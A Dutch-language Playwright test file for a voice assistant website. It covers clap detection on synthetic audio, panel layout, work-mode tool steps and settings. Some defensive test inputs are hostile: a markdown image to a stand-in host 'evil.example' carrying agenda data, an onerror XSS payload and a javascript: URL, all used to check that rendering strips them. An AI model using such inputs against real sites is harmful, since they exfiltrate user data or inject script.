// Tests voor de website (index.html + ai.js): de pagina in Chromium met een nep-Supabase, zonder internet.
// Draaien: node tests/website.test.mjs   (Playwright en Chromium nodig)
import { createRequire } from "node:module";
import http from "node:http";
import fs from "node:fs";
import path from "node:path";

const laad = createRequire(import.meta.url);
const { chromium } = laad("playwright"); // ook een globaal geïnstalleerde Playwright (NODE_PATH)
// De echte marked en DOMPurify (zelfde versies als index.html), zodat we testen wat er echt in beeld komt.
const MARKED = fs.readFileSync(laad.resolve("marked/marked.min.js"), "utf8");
const PURIFY = fs.readFileSync(laad.resolve("dompurify/dist/purify.min.js"), "utf8");
const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
let fouten = 0;
const ok = (c, m) => { console.log(c ? "OK  " : "FOUT", m); if (!c) fouten++; };

// ---------- 2× klappen: de herkenning uit ai.js, los getest met nagebootst geluid ----------
{
  const src = fs.readFileSync(path.join(ROOT, "ai.js"), "utf8");
  const KlapDetector = new Function(src.slice(src.indexOf("class KlapDetector {"), src.indexOf("\nvar wakeRec")) + "; return KlapDetector")();
  let seed = 1;
  const rnd = () => { seed = (seed * 16807) % 2147483647; return seed / 2147483647; };
  const ruis = () => Math.sqrt(-2 * Math.log(rnd() + 1e-12)) * Math.cos(2 * Math.PI * rnd());
  for (const R of [16000, 48000]) {
    const stil = (s, n = 0.002) => Array.from({ length: Math.round(R * s) }, () => ruis() * n);
    const klap = (l = 0.5) => Array.from({ length: Math.round(R * 0.08) }, (_, i) => { const t = i / R; return ruis() * l * Math.min(1, t / 0.002) * Math.exp(-t / 0.025); });
    const stem = (s) => Array.from({ length: Math.round(R * s) }, (_, i) => { const t = i / R; return 0.15 * (Math.sin(2 * Math.PI * 180 * t) + 0.5 * Math.sin(2 * Math.PI * 420 * t)) * (0.6 + 0.4 * Math.sin(2 * Math.PI * 4 * t)); });
    const muziek = (s) => {
      const x = Array.from({ length: Math.round(R * s) }, (_, i) => 0.1 * Math.sin(2 * Math.PI * 220 * i / R));
      for (let b = 0; b < s; b += 0.5) klap(0.4).forEach((v, j) => { const i = Math.round(b * R) + j; if (i < x.length) x[i] += v; });
      return x;
    };
    const keer = (delen) => {
      const d = new KlapDetector(R), x = Float32Array.from(delen.flat().map((v) => Math.max(-1, Math.min(1, v))));
      let n = 0;
      for (let i = 0; i < x.length; i += 128) if (d.voed(x.subarray(i, i + 128))) n++;
      return n;
    };
    ok(keer([stil(1), klap(), stil(0.3), klap(), stil(1)]) === 1, `${R} Hz: twee klappen`);
    ok(keer([stil(1, 0.004), klap(0.15), stil(0.4, 0.004), klap(0.15), stil(1, 0.004)]) === 1, `${R} Hz: twee zachte klappen`);
    ok(keer([stem(2), stil(0.6), klap(), stil(0.35), klap(), stil(1)]) === 1, `${R} Hz: praten, dan klappen`);
    ok(keer([stil(1), klap(), stil(2)]) === 0, `${R} Hz: één klap telt niet`);
    ok(keer([stil(1), klap(), stil(0.25), klap(), stil(0.25), klap(), stil(1)]) === 0, `${R} Hz: drie klappen (applaus) tellen niet`);
    ok(keer([stil(1), klap(), stil(1.5), klap(), stil(1)]) === 0, `${R} Hz: te ver uit elkaar`);
    ok(keer([stil(1), klap(), stil(0.03), klap(), stil(1)]) === 0, `${R} Hz: echo telt niet`);
    ok(keer([stil(0.5), stem(3), stil(1)]) === 0, `${R} Hz: praten telt niet`);
    ok(keer([muziek(6)]) === 0, `${R} Hz: muziek met beat telt niet`);
  }
}

// ---------- De pagina zelf ----------
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".json": "application/json", ".webmanifest": "application/json", ".png": "image/png", ".svg": "image/svg+xml" };
const srv = http.createServer((req, res) => {
  const f = path.join(ROOT, decodeURIComponent(req.url.split("?")[0]).replace(/^\/+/, "") || "index.html");
  if (!f.startsWith(ROOT) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { res.writeHead(404); return res.end(); }
  res.writeHead(200, { "content-type": TYPES[path.extname(f)] || "application/octet-stream" });
  res.end(fs.readFileSync(f));
}).listen(0);
const basis = `http://127.0.0.1:${srv.address().port}`;
const NEP_SUPABASE = `window.supabase={createClient:()=>({auth:{getSession:async()=>({data:{session:null}}),onAuthStateChange:()=>({data:{subscription:{unsubscribe(){}}}}),signOut:async()=>({}),signInWithOtp:async()=>({})},from:()=>({select:()=>({eq:()=>({order:async()=>({data:[]})})})})})}`;

const browser = await chromium.launch();
for (const [naam, vp] of [["computer", { width: 1440, height: 900 }], ["telefoon", { width: 390, height: 844 }]]) {
  const page = await browser.newPage({ viewport: vp, isMobile: naam === "telefoon", hasTouch: naam === "telefoon" });
  const paginafouten = [];
  page.on("pageerror", (e) => paginafouten.push(e.message));
  await page.route("**/*", (r) => {
    const u = r.request().url();
    if (u.startsWith(basis)) return r.continue();
    if (u.includes("supabase-js")) return r.fulfill({ contentType: "text/javascript", body: NEP_SUPABASE });
    if (u.includes("marked")) return r.fulfill({ contentType: "text/javascript", body: MARKED });
    if (u.includes("purify")) return r.fulfill({ contentType: "text/javascript", body: PURIFY });
    return r.fulfill({ status: 404, body: "" });
  });
  await page.goto(basis + "/index.html");
  await page.waitForTimeout(600);
  ok(!paginafouten.length, `${naam}: geen fouten bij het laden ${paginafouten.join(" | ")}`);
  await page.evaluate(() => { document.querySelectorAll("#login,.login").forEach((e) => { e.hidden = true; }); document.getElementById("app").hidden = false; });
  const schakelaars = await page.$$eval(".switch span", (s) => s.map((x) => x.textContent.replace(/\s+/g, " ").trim()));
  ok(schakelaars.includes("2× KLAPPEN") && schakelaars.includes("WERKMODUS"), `${naam}: schakelaars 2× KLAPPEN en WERKMODUS (${schakelaars.join(", ")})`);
  ok(!schakelaars.some((s) => /HÉ ECO/.test(s)), `${naam}: geen "Hé ECO"-schakelaar meer`);

  // Ingeklapt paneel: het lipje is langs de rand te verslepen, ook naar de andere kant, en tikken klapt uit
  if (naam === "computer") {
    await page.evaluate(() => { document.getElementById("boot")?.remove(); initLayout(); dock(document.querySelector('[data-win="bediening"]'), "l"); });
    const lipje = page.locator("#dockL button");
    const b = await lipje.boundingBox();
    await page.mouse.move(b.x + b.width / 2, b.y + b.height / 2); await page.mouse.down();
    await page.mouse.move(b.x + 8, 700, { steps: 5 }); await page.mouse.up();
    const na = await lipje.boundingBox();
    ok(Math.abs(na.y + na.height / 2 - 700) < 3, `lipje omlaag gesleept (${Math.round(b.y)} → ${Math.round(na.y)})`);
    ok(await page.$eval('[data-win="bediening"]', (w) => w.classList.contains("docked")), "slepen klapt niet uit");
    await page.mouse.move(na.x + 8, 700); await page.mouse.down(); await page.mouse.move(1400, 300, { steps: 5 }); await page.mouse.up();
    ok(await page.$("#dockR button"), "naar de rechterrand gesleept");
    await page.click("#dockR button");
    ok(!(await page.$eval('[data-win="bediening"]', (w) => w.classList.contains("docked"))), "tikken klapt uit");
  }

  // Antwoorden: geen plaatjes die vanzelf laden (zouden gegevens naar buiten kunnen sturen), tekst en links blijven
  const html = await page.evaluate(() => md("Klaar. ![x](https://evil.example/p.png?d=agenda) [bron](https://nos.nl)"));
  ok(!/<img/i.test(html) && /href="https:\/\/nos\.nl"/.test(html) && /Klaar\./.test(html), `${naam}: antwoord zonder plaatje, wel tekst en link`);

  // Werkmodus: reactor naar rechtsonder, stappen live, daarna terug
  const plek = () => page.$eval(".main-reactor", (e) => e.getBoundingClientRect().toJSON());
  const voor = await plek();
  await page.evaluate(() => {
    setState("thinking"); werk.beurt();
    werk.start({ t: "tool", name: "web_zoeken", id: "w1", info: "openingstijden AH Den Haag" });
    werk.klaar({ id: "w1", ok: true, ms: 1200, uit: "Open tot 22:00", bronnen: ["ah.nl"] });
    werk.start({ t: "tool", name: "web_lezen", id: "w2", info: "https://www.ah.nl/x" });
    werk.klaar({ id: "w2", ok: true, ms: 800, uit: "<img src=x onerror=alert(1)>", url: "javascript:alert(1)", voorbeeld: "<b>vet</b>" });
    werk.start({ t: "tool", name: "agenda_bekijken", id: "w3", info: "morgen" });
    werk.klaar({ id: "w3", ok: false, uit: "agenda niet bereikbaar" });
    werk.start({ t: "tool", name: "pc", id: "w4", info: "app_openen Spotify" });
  });
  await page.waitForTimeout(650);
  const na = await plek();
  ok(na.width < voor.width * 0.6 && na.x > voor.x && na.y > voor.y, `${naam}: reactor naar rechtsonder (${Math.round(voor.width)}→${Math.round(na.width)} px)`);
  const stappen = await page.$$eval(".werk-stap", (l) => l.map((x) => x.className.replace("werk-stap ", "")));
  ok(stappen.join(",") === "ok,ok,mis,bezig", `${naam}: stappen ok/ok/mis/bezig (${stappen})`);
  ok(!(await page.$(".werk-stap img, .werk-stap a[href^='javascript']")), `${naam}: tekst van buiten wordt nooit HTML of een javascript-link`);
  if (naam === "computer") {
    ok(await page.$eval("body", (b) => b.dataset.rustig === "on"), "rustig scherm: panelen opzij zodra ECO werkt");
    { const st = await page.$eval('[data-win="status"]', (w) => [getComputedStyle(w).opacity, getComputedStyle(w).pointerEvents, getComputedStyle(w).transform, w.className]); ok(+st[0] < 0.05 && st[1] === "none", `systeemstatus is weggeschoven (${st})`); }
    ok(await page.$eval('[data-win="cmd"]', (w) => getComputedStyle(w).opacity === "1"), "opdrachtregel blijft");
    ok(await page.$eval("#panelenTerug", (k) => !k.hidden), "knop PANELEN om ze terug te halen");
  }
  await page.evaluate(() => { werk.klaarAlles(); werk.sluit(); });
  await page.waitForTimeout(650);
  ok(await page.$eval("body", (b) => b.dataset.rustig !== "on"), `${naam}: panelen terug als ECO klaar is`);
  const terug = await plek();
  ok(Math.abs(terug.x - voor.x) < 3 && Math.abs(terug.width - voor.width) < 3, `${naam}: reactor terug op zijn plek`);
  ok(await page.$eval("#werk", (w) => w.hidden), `${naam}: werkpaneel weer dicht`);
  await page.evaluate(() => { document.getElementById("werkmodus").checked = false; werk.beurt(); werk.start({ name: "web_zoeken", id: "x" }); });
  ok(!(await page.$eval("#werk", (w) => !w.hidden)), `${naam}: WERKMODUS uit = geen paneel`);
  // Instellingen: BEDIENING is rustig, de rest zit in een venster met tabbladen
  ok(await page.$$eval('[data-win="bediening"] .switch', (l) => l.length) === 2, `${naam}: BEDIENING heeft alleen STEM en LIVE`);
  await page.evaluate(() => document.getElementById("instOpen").click());
  ok(await page.$eval("#instellingen", (m) => !m.hidden), `${naam}: INSTELLINGEN opent`);
  await page.evaluate(() => document.querySelector('.inst-tabs [data-tab="microfoon"]').click());
  ok(await page.$eval("#micSel", (e) => e.offsetParent !== null) && await page.$eval("#sfx", (e) => e.closest("[data-blad]").hidden), `${naam}: tabblad MICROFOON`);
  await page.keyboard.press("Escape");
  ok(await page.$eval("#instellingen", (m) => m.hidden), `${naam}: Escape sluit`);
  if (naam === "telefoon") {
    ok(await page.$$eval(".right>.panel[data-win]", (l) => l.every((p) => getComputedStyle(p).display === "none")), "telefoon: panelen standaard dicht (rustig)");
    await page.click('.mob-tabs [data-mob="rooster"]');
    ok(await page.$eval('[data-win="rooster"]', (p) => getComputedStyle(p).display !== "none") && await page.$eval('[data-win="lijstjes"]', (p) => getComputedStyle(p).display === "none"), "telefoon: tab ROOSTER toont alleen het rooster");
    await page.click('.mob-tabs [data-mob="rooster"]');
    ok(await page.$eval('[data-win="rooster"]', (p) => getComputedStyle(p).display === "none"), "telefoon: nog eens tikken sluit");
  }
  // Een antwoord blijft staan als ECO weer gaat luisteren
  await page.evaluate(() => { setCaption("Morgen heb je om 08:45 werkcollege en om 11:00 een vragenuur."); micOn(true); micOn(false); });
  ok(/werkcollege/.test(await page.$eval("#caption", (c) => c.textContent)), `${naam}: antwoord blijft staan tijdens luisteren`);
  await page.close();
}
await browser.close();
srv.close();
console.log(fouten ? `${fouten} FOUT(EN)` : "alles OK");
process.exit(fouten ? 1 : 0);
